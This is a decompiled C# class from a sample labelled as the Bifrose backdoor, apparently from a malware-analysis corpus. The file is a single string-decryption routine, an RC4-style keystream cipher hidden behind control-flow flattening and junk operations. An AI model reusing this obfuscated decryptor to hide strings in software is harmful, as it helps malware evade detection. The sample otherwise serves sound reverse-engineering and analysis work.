// Decompiled with JetBrains decompiler
// Type: m
// Assembly: Hurensohn, Version=2.0.0.2, Culture=neutral, PublicKeyToken=null
// MVID: 1C815098-DDB6-4137-B390-DF1007A7923D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.Bifrose.gegg-34c178e95b2f4f07990304185bda056ea355ad0ac6f3a0d0f6190d6370da7cd5.exe

using Microsoft.VisualBasic;
using System;
using System.Diagnostics;
using System.Text;
using System.Threading;

public class m
{
  [DebuggerNonUserCode]
  public m()
  {
  }

  public static string a(string A_0, string A_1)
  {
label_2:
    int index1 = 0;
    int index2 = 0;
    StringBuilder stringBuilder = new StringBuilder();
    string empty = string.Empty;
    int[] numArray1 = new int[257];
    int[] numArray2 = new int[257];
    int length = A_1.Length;
    int location1 = 0;
    int num1 = 1;
    int location2;
    int index3;
    while (true)
    {
      switch (num1)
      {
        case 0:
          if (location1 > (int) byte.MaxValue)
          {
            num1 = 5;
            continue;
          }
          char String = A_1.Substring(location1 % length, 1).ToCharArray()[0];
          numArray2[location1] = Strings.Asc(String);
          numArray1[location1] = location1;
          Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
          num1 = 4;
          continue;
        case 1:
        case 4:
          num1 = 0;
          continue;
        case 2:
          if (false)
            ;
          if (location2 > (int) byte.MaxValue)
          {
            num1 = 9;
            continue;
          }
          index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
          int num2 = numArray1[location2];
          numArray1[location2] = numArray1[index3];
          numArray1[index3] = num2;
          Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
          num1 = 6;
          continue;
        case 3:
        case 11:
          num1 = 8;
          continue;
        case 5:
          index3 = 0;
          location2 = 0;
          num1 = 7;
          continue;
        case 6:
        case 7:
          num1 = 2;
          continue;
        case 8:
          if (location1 > A_0.Length)
          {
            num1 = 10;
            continue;
          }
          index1 = checked (index1 + 1) % 256;
          index2 = checked (index2 + numArray1[index1]) % 256;
          int num3 = numArray1[index1];
          numArray1[index1] = numArray1[index2];
          numArray1[index2] = num3;
          int num4 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
          int CharCode = Strings.Asc(A_0.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num4;
          stringBuilder.Append(Strings.Chr(CharCode));
          Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
          num1 = 3;
          continue;
        case 9:
          location1 = 1;
          num1 = 11;
          continue;
        case 10:
          goto label_18;
        default:
          goto label_2;
      }
    }
label_18:
    string str = stringBuilder.ToString();
    stringBuilder.Length = 0;
    return str;
  }
}
